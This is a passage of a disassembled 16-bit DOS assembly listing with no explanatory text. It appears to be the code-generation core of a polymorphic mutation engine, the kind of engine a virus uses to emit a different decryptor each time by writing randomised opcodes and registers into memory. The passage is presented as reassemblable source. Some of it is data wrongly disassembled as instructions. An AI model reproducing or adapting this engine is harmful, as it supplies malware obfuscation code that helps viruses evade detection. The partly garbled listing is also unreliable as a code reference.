		shl	byte ptr [si+3],1	; Shift w/zeros fill
		jns	loc_62			; Jump if not sign
		mov	bl,0F7h
		mov	al,3
		jmp	short loc_61		; (05A3)
		cmp	cx,15Ch
		jne	loc_59			; Jump if not equal
		sub	cx,3
		sub	di,3
		mov	bl,[si]
loc_58:
		xor	bh,bh			; Zero register
		dec	byte ptr [bx+si-10h]
loc_59:
		mov	bx,data_8e		; (0000:0150=0E0h)
		jmp	short loc_65		; (05E7)
		or	dh,dh			; Zero ?
		jns	loc_60			; Jump if not sign
		mov	dh,[si]
		jmp	short loc_60		; (0592)
		push	bp
		call	sub_40			; (0737)
		mov	al,[si+1]
		or	al,90h
		stosb				; Store al to es:[di]
		pop	ax
		or	dh,dh			; Zero ?
		jns	loc_60			; Jump if not sign
		xchg	ax,dx
loc_60:
		pop	ax
		mov	bh,0FFh
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_27:
		mov	byte ptr [di],0CBh
		retn
		db	0E8h, 00h, 00h
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_28:
		and	al,2
		add	al,87h
		xchg	ax,bx
		mov	al,dh
loc_61:
;*		call	sub_13			;*(03D6)
		db	0E8h, 30h,0FEh
loc_62:
		mov	al,[si]
		cmp	di,359h
		jae	loc_63			; Jump if above or =
		push	ax
		dec	bp
		xor	dl,dl			; Zero register
		mov	dh,al
		shr	byte ptr [si-1Eh],1	; Shift w/zeros fill
		call	sub_25			; (04F0)
		push	dx
		push	di
		call	sub_21			; (0471)
		call	sub_31			; (0675)
		pop	di
		pop	dx
		push	cx
		call	sub_26			; (04F7)
		pop	cx
		pop	ax
;*		call	sub_44			;*(0984)
		db	0E8h,0B7h, 03h
		or	ch,ch			; Zero ?
		js	loc_64			; Jump if sign=1
loc_63:
		or	al,40h			; '@'
		stosb				; Store al to es:[di]
		stosb				; Store al to es:[di]
loc_64:
		mov	al,75h			; 'u'
		stosb				; Store al to es:[di]
		pop	bx
		pop	ax
		mov	cx,ax
		sub	ax,di
		dec	ax
		stosb				; Store al to es:[di]
		or	al,al			; Zero ?
		js	loc_65			; Jump if sign=1
		xor	bx,bx			; Zero register
		retn
loc_65:
		call	sub_27			; (0595)
		push	cx
		mov	dx,559h
		cmp	di,359h
		jae	loc_72			; Jump if above or =
		push	bx
		mov	bl,7
		mov	dx,bp
;*		call	sub_24			;*(04EC)
		db	0E8h,0F0h,0FEh
		push	di
		mov	di,offset ds:[158h]	; (78CA:0158=95h)
		xor	bx,bx			; Zero register
		mov	dx,di
		mov	cl,[si-18h]
loc_66:
		shr	cl,1			; Shift w/zeros fill
		pushf				; Push flags
		jnc	loc_67			; Jump if carry=0
		cmp	bh,[bx+si-10h]
		jne	loc_67			; Jump if not equal
		lea	ax,[bx+50h]		; Load effective addr
		std				; Set direction flag
		stosb				; Store al to es:[di]
loc_67:
		inc	bx
		popf				; Pop flags
		jnz	loc_66			; Jump if not zero
		inc	di
		cmp	di,dx
		jae	loc_70			; Jump if above or =
		cmp	bh,[si-1Dh]
		jne	loc_68			; Jump if not equal
		mov	di,dx
		mov	byte ptr [di],60h	; '`'
		jmp	short loc_70		; (0643)
loc_68:
		push	di
loc_69:
		call	sub_29			; (062F)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_29:
		and	al,7
		cbw				; Convrt byte to word
		xchg	ax,bx
		add	bx,di
		cmp	bx,dx
		ja	loc_69			; Jump if above
		mov	al,[di]
		xchg	al,[bx]
		stosb				; Store al to es:[di]
		cmp	di,dx
		jne	loc_69			; Jump if not equal
		pop	di
loc_70:
		pop	bp
		mov	cx,bp
		sub	cx,di
		cmp	word ptr [si-1Ah],0
		je	loc_71			; Jump if equal
		add	cx,15Ch
		sub	cx,di
loc_71:
		mov	dx,[si-14h]
		mov	ax,dx
		add	dx,cx
		add	ax,[si-12h]
		pop	bx
		cmp	word ptr [si-12h],0
		jne	loc_73			; Jump if not equal
loc_72:
		mov	ax,dx
loc_73:
		call	sub_30			; (066F)
		xchg	ax,dx
		pop	dx
		mov	bx,[si-1Ch]
sub_22		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_30		proc	near
		sub	ax,[si-16h]
		mov	[bx],ax
		retn
sub_30		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_31		proc	near
		xor	cx,cx			; Zero register
		mov	al,data_17		; (78CA:0129=0)
		cbw				; Convrt byte to word
		xchg	ax,bx
		mov	dx,0FFFEh
		mov	al,[bx]
		cmp	al,3
		je	loc_74			; Jump if equal
		cmp	al,4
		jne	loc_ret_75		; Jump if not equal
		neg	dx
loc_74:
		shl	bl,1			; Shift w/zeros fill
		push	bx
		inc	bx
		call	sub_33			; (0696)
		pop	bx
		mov	dx,2
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_33:
		mov	bl,[bx+21h]
		cmp	bh,[bx]
		jne	loc_ret_75		; Jump if not equal
		mov	si,bx
		add	dx,[bx+si+21h]
		or	dl,dl			; Zero ?
		jz	loc_ret_75		; Jump if zero
		mov	[bx+si+21h],dx
		dec	cx
  
loc_ret_75:
		retn
sub_31		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_34		proc	near
		xor	bh,bh			; Zero register
		and	byte ptr [bx],7Fh
		mov	dl,[bx]
		mov	ax,bx
		shl	bl,1			; Shift w/zeros fill
		mov	bx,[bx+21h]
		cmp	dl,3
		jb	loc_ret_80		; Jump if below
		push	ax
		push	bx
		call	sub_34			; (06AB)
		pop	bx
		mov	bl,bh
		push	dx
		call	sub_34			; (06AB)
		xchg	ax,bx
		pop	cx
		pop	bx
		mov	dh,[bx]
		sub	dh,0Dh
		jz	loc_76			; Jump if zero
		add	dh,7
		jnz	loc_77			; Jump if not zero
loc_76:
		mov	[di+3],dh
		mov	[di-0Eh],dh
		jmp	short loc_79		; (0705)
loc_77:
		cmp	dh,5
		jae	loc_79			; Jump if above or =
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_35:
		or	dl,dl			; Zero ?
		jnz	loc_78			; Jump if not zero
		cmp	dl,[di-1Dh]
		je	loc_79			; Jump if equal
		sub	al,0Eh
		and	al,0Fh
		cmp	al,5
		jae	loc_78			; Jump if above or =
		cmp	al,2
		jae	loc_79			; Jump if above or =
		cmp	dh,3
		jb	loc_79			; Jump if below
loc_78:
		mov	[di-0Fh],bh
		mov	dl,80h
loc_79:
		or	dl,cl
		and	dl,80h
		or	dl,[bx]
		mov	[bx],dl
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_36:
  
loc_ret_80:
		retn
sub_34		endp
  
		call	sub_38			; (0720)
		call	sub_37			; (0715)
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_37		proc	near
		and	al,7
		jz	loc_83			; Jump if zero
		xor	al,al			; Zero register
		cmp	al,[si+3]
		je	loc_83			; Jump if equal
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_38:
loc_81:
		call	sub_39			; (0723)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_39:
		and	al,3
		jnz	loc_82			; Jump if not zero
		mov	al,7
loc_82:
		xor	al,4
loc_83:
		cbw				; Convrt byte to word
		mov	bx,ax
		xchg	bh,[bx+si-8]
		or	bh,bh			; Zero ?
		jz	loc_81			; Jump if zero
		stosb				; Store al to es:[di]
  
loc_ret_84:
		retn
sub_37		endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_40		proc	near
		mov	word ptr [si+2],80FFh
		xor	bh,bh			; Zero register
		mov	al,[bx]
		and	ax,7Fh
		shl	bl,1			; Shift w/zeros fill
		mov	dx,0FF00h
		dec	ax
		jz	loc_ret_84		; Jump if zero
		mov	dh,[si]
		dec	ax
		jz	loc_ret_84		; Jump if zero
		mov	dx,[bx+21h]
		js	loc_ret_84		; Jump if sign=1
		push	ax
		push	dx
		push	bx
		mov	bl,dh
		call	sub_40			; (0737)
		pop	bx
		pop	cx
		pop	ax
		cmp	al,0Ch
		jne	loc_89			; Jump if not equal
		or	dl,dl			; Zero ?
		jnz	loc_ret_84		; Jump if not zero
		cmp	dh,[si]
		je	loc_ret_84		; Jump if equal
		push	ax
		push	cx
		push	bx
		push	dx
		call	sub_43			; (0981)
		pop	dx
		mov	ax,[si+1]
		cmp	dh,al
		jne	loc_85			; Jump if not equal
		or	ah,ah			; Zero ?
		jz	loc_86			; Jump if zero
loc_85:
		mov	bl,85h
		call	sub_18			; (0447)
loc_86:
		pop	bx
		mov	al,75h			; 'u'
		stosb				; Store al to es:[di]
		inc	bp
		jz	loc_88			; Jump if zero
		cmp	di,data_15e		; (5F44:0359=0FFh)
		jb	loc_87			; Jump if below
		add	byte ptr [di-1],57h	; 'W'
loc_87:
		mov	ax,di
		xchg	ax,[bx+63h]
		mov	ds:data_12e[bx],ax	; (5F44:00E7=0FFFFh)
loc_88:
		dec	bp
		inc	di
		mov	dx,di
		jmp	short loc_96		; (080D)
loc_89:
		push	ax
		push	cx
		or	dl,dl			; Zero ?
		jnz	loc_96			; Jump if not zero
		cmp	dh,[si+1]
		jne	loc_96			; Jump if not equal
		mov	al,[si+3]
		or	al,al			; Zero ?
		js	loc_91			; Jump if sign=1
		and	al,7
		jz	loc_90			; Jump if zero
		cmp	al,[si]
		je	loc_91			; Jump if equal
		cmp	al,3
		jb	loc_91			; Jump if below
loc_90:
		xor	byte ptr [di-2],2
		test	byte ptr [si+3],40h	; '@'
		jz	loc_94			; Jump if zero
		push	ax
		or	al,0D8h
		mov	ah,al
		mov	al,0F7h
		stosw				; Store ax to es:[di]
		pop	ax
		jmp	short loc_94		; (0807)
loc_91:
		call	sub_41			; (07DA)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_41:
		mov	cx,8
loc_92:
		push	ax
		mov	al,dh
		or	al,50h			; 'P'
		stosb				; Store al to es:[di]
		pop	ax
		mov	bl,80h
		jcxz	loc_95			; Jump if cx=0
		dec	di
		dec	cx
		inc	ax
		and	al,7
		cbw				; Convrt byte to word
		mov	bx,ax
		mov	ah,[bx+si-8]
		or	ah,ah			; Zero ?
		jz	loc_92			; Jump if zero
		dec	bx
		jnz	loc_93			; Jump if not zero
		pop	bx
		push	bx
		xor	bh,bh			; Zero register
		mov	ah,[bx]
		or	ah,ah			; Zero ?
		js	loc_92			; Jump if sign=1
loc_93:
;*		call	sub_44			;*(0984)
		db	0E8h, 7Dh, 01h
loc_94:
		xchg	ax,bx
		inc	byte ptr [bx+si-8]
loc_95:
		mov	dh,bl
loc_96:
		pop	bx
		push	dx
		call	sub_40			; (0737)
		call	sub_43			; (0981)
		pop	dx
		pop	ax
		mov	byte ptr [si+3],80h
		cmp	al,0Ch
		jne	loc_97			; Jump if not equal
		mov	bx,dx
		mov	dx,di
		sub	dx,bx
		mov	[bx-1],dl
;*		jmp	loc_122			;*(094D)
		db	0E9h, 22h, 01h
loc_97:
		mov	ch,ah
		push	ax
		or	dl,dl			; Zero ?
		jnz	loc_100			; Jump if not zero
		cmp	dh,80h
		jne	loc_99			; Jump if not equal
		sub	al,5
		cmp	al,4
		mov	al,1
		jc	loc_98			; Jump if carry Set
		inc	ax
loc_98:
		mov	dh,al
		or	al,58h			; 'X'
		stosb				; Store al to es:[di]
		jmp	short loc_100		; (0856)
loc_99:
		or	dh,dh			; Zero ?
		js	loc_100			; Jump if sign=1
		cmp	dh,[si]
		je	loc_100			; Jump if equal
		mov	bl,dh
		xor	bh,bh			; Zero register
		dec	byte ptr [bx+si-8]
loc_100:
		pop	ax
		mov	bl,0Bh
		sub	al,9
		jz	loc_101			; Jump if zero
		mov	bl,23h			; '#'
		dec	ax
		jz	loc_101			; Jump if zero
		add	al,6
		cbw				; Convrt byte to word
		jns	loc_109			; Jump if not sign
		mov	bl,33h			; '3'
		inc	ax
		jz	loc_101			; Jump if zero
		mov	bl,3
		jp	loc_101			; Jump if parity=1
		mov	bl,2Bh			; '+'
loc_101:
		mov	al,[si+1]
		or	dl,dl			; Zero ?
		jnz	loc_104			; Jump if not zero
		and	dh,87h
		cmp	bl,2Bh			; '+'
		jne	loc_102			; Jump if not equal
		or	dh,40h			; '@'
loc_102:
		mov	[si+3],dh
loc_103:
;*		call	sub_12			;*(03D2)
		db	0E8h, 48h,0FBh
		jnc	loc_116			; Jump if carry=0
		or	al,al			; Zero ?
		jz	loc_104			; Jump if zero
		inc	bp
loc_104:
		xor	bl,6
		push	dx
		inc	dx
		inc	dx
		cmp	dx,5
		pop	dx
		jnc	loc_113			; Jump if carry=0
		or	ax,ax			; Zero ?
		js	loc_106			; Jump if sign=1
		cmp	bl,35h			; '5'
		jne	loc_113			; Jump if not equal
		inc	dx
		jnz	loc_112			; Jump if not zero
		mov	dh,al
		mov	al,2
loc_105:
		mov	bl,0F7h
		mov	ch,bl
		jmp	short loc_103		; (0887)
loc_106:
		or	dx,dx			; Zero ?
		jns	loc_107			; Jump if not sign
		neg	dx
		xor	bl,28h			; '('
loc_107:
		or	al,40h			; '@'
		cmp	bl,5
		je	loc_108			; Jump if equal
		or	al,8
loc_108:
		stosb				; Store al to es:[di]
		dec	dx
		jz	loc_116			; Jump if zero
		stosb				; Store al to es:[di]
		jmp	short loc_116		; (08FD)
loc_109:
		mov	cl,4
		jnz	loc_117			; Jump if not zero
loc_110:
		or	dl,dl			; Zero ?
		jz	loc_111			; Jump if zero
		mov	ax,2BAh
		stosb				; Store al to es:[di]
		xchg	ax,dx
		stosw				; Store ax to es:[di]
loc_111:
		xchg	ax,cx
		jmp	short loc_105		; (08AD)
loc_112:
		dec	dx
loc_113:
		or	al,al			; Zero ?
		jz	loc_115			; Jump if zero
		and	bl,38h			; '8'
		or	al,0C0h
		or	bl,al
		mov	al,dl
		cbw				; Convrt byte to word
		xor	ax,dx
		mov	al,81h
		jnz	loc_114			; Jump if not zero
		mov	al,83h
		stc				; Set carry flag
loc_114:
		stosb				; Store al to es:[di]
loc_115:
		xchg	ax,bx
		stosb				; Store al to es:[di]
		xchg	ax,dx
		stosw				; Store ax to es:[di]
		jnc	loc_116			; Jump if carry=0
		dec	di
loc_116:
;*		jmp	short loc_121		;*(094A)
		db	0EBh, 4Bh
loc_117:
		inc	cx
		cmp	al,7
		je	loc_110			; Jump if equal
		inc	ax
		cmp	al,4
		pushf				; Push flags
		jnc	loc_118			; Jump if carry=0
		sub	al,2
loc_118:
		or	dl,dl			; Zero ?
;*		jnz	loc_123			;*Jump if not zero
		db	 75h, 43h
		push	ax
		mov	al,1
		mov	bl,8Ah
		mov	ch,bl
		cmp	dh,3
		je	loc_119			; Jump if equal
		inc	bx
loc_119:
;*		call	sub_15			;*(0424)
		db	0E8h, 04h,0FBh
		pop	ax
		popf				; Pop flags
		push	ax
		jc	loc_120			; Jump if carry Set
		mov	ax,1F80h
		test	ah,[si-1Dh]
		jz	loc_120			; Jump if zero
		stosb				; Store al to es:[di]
		mov	al,0E1h
		stosw				; Store ax to es:[di]
loc_120:
		pop	ax
		mov	bl,0D3h
		mov	dl,1
		les	bx,dword ptr [si+1Ah]	; Load 32 bit ptr
		nop				;*ASM fixup - displacement
		test	al,[bx+16h]
		add	[bp+si],ax
		test	bl,dl
		push	ss
		add	[bp+si],ax
		test	ax,ax
		push	ss
		add	[bp+si],ax
		test	cx,si
		push	ss
		add	[bp+si],ax
		xchg	al,ds:data_13e[di]	; (5F44:0116=0FFh)
		add	al,[bx+di]
		mov	al,ds:data_11e		; (5F44:0071=0FFh)
		add	di,ax
		pop	es
loc_125:
		mov	dh,[si+1]
;*		call	sub_20			;*(046B)
		db	0E8h, 0Bh,0FBh
		xchg	ax,dx
		cmp	bl,0C1h
		je	loc_126			; Jump if equal
		shr	al,1			; Shift w/zeros fill
		jc	loc_127			; Jump if carry Set
		xchg	ax,bx
		stosb				; Store al to es:[di]
		xchg	ax,dx
loc_126:
		stosb				; Store al to es:[di]
loc_127:
		mov	[si+2],ch
loc_128:
		mov	dh,[si+1]
		xor	dl,dl			; Zero register
		retn
sub_40		endp
  
		mov	bl,0C1h
		popf				; Pop flags
		jnc	loc_129			; Jump if carry=0
		mov	ch,bl
		test	dl,8
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_43		proc	near
		jz	loc_129			; Jump if zero
		neg	dl
		xor	al,1
loc_129:
		and	dl,0Fh
		jz	loc_128			; Jump if zero
		cmp	dl,1
		je	loc_130			; Jump if equal
		cmp	ah,[si-1Dh]
		je	loc_125			; Jump if equal
loc_130:
		mov	bl,0D1h
		cmp	dl,3
		jb	loc_125			; Jump if below
		push	ax
		mov	al,0B1h
		mov	ah,dl
		stosw				; Store ax to es:[di]
;*		jmp	short loc_124		;*(0955)
sub_43		endp
  
		db	0EBh,0B0h
		mov	al,[si+1]
		cbw				; Convrt byte to word
		push	ax
		cmp	di,359h
		jae	loc_131			; Jump if above or =
		mov	bx,ax
		mov	[bx+si-10h],bh
loc_131:
		or	dl,dl			; Zero ?
		jnz	loc_132			; Jump if not zero
		mov	bl,8Bh
		call	sub_17			; (0444)
		jnc	loc_133			; Jump if carry=0
loc_132:
		or	al,0B8h
		stosb				; Store al to es:[di]
		xchg	ax,dx
		stosw				; Store ax to es:[di]
loc_133:
		pop	ax
		retn
		db	0A2h, 8Ah, 02h, 00h, 00h, 74h
  
seg_a		ends
  
  
  
		end	start
